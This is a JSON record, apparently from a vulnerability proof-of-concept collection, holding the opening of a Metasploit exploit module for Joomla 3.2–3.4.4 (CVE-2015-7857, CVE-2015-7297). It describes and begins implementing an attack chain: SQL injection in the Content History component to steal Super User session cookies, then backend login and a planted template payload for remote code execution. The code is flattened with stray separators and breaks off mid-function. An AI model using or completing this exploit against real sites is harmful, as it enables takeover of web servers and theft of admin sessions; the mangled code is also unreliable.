{
    "text": "vul_name : Joomla Content History SQL Injection Remote Code Execution ， vul_cve : CVE-2015-7857 , CVE-2015-7297 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"Joomla Content History SQLi Remote Code Execution\" ,  ， 'Description' => %q{ ， This module exploits a SQL injection vulnerability found in Joomla versions ， 3.2 up to 3.4.4. The vulnerability exists in the Content History administrator ， component in the core of Joomla. Triggering the SQL injection makes it possible ， to retrieve active Super User sessions. The cookie can be used to login to the ， Joomla administrator backend. By creating a new template file containing our ， payload , remote code execution is made possible. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Asaf Orpani' ,  # Vulnerability discovery ， 'xistence <xistence [ at ] 0x90.nl>' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2015-7857' ]  ,  # Admin session hijacking ，  [ 'CVE' , '2015-7297' ]  ,  # SQLi ，  [ 'CVE' , '2015-7857' ]  ,  # SQLi ，  [ 'CVE' , '2015-7858' ]  ,  # SQLi ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ，  # Arbitrary big number. The payload gets sent as POST data , so ，  # really it's unlimited ， 'Space' => 262144 ,  # 256k ， } ,  ， 'Platform' => [ 'php' ]  ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => ，  [  ，  [ 'Joomla 3.x <= 3.4.4' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Oct 23 2015\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Joomla' , '/' ]  )  ，  ]  , self.class )  ， end ， def check ，  # Request using a non-existing table ， res = sqli ( rand_text_alphanumeric ( rand ( 10 ) +6 ) ",
    "time": "2015.11.21"
}